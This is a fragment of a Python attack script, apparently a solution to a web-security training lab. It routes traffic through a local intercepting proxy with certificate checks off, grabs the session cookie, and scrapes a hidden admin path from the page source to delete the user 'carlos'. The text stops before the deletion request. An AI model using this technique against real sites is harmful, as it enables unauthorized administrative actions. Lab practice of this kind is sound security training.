import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def delete_user(url):

    r = requests.get(url, verify=False, proxies=proxies)

    # Retrieve session cookie
    session_cookie = r.cookies.get_dict().get('session')

    # Retrieve the admin path
    soup = BeautifulSoup(r.text, 'lxml')
    admin_instances = soup.find(text=re.compile("/admin-"))
    admin_path = re.search("href', '(.*)'", admin_instances).group(1)

    # Delete Carlos user
    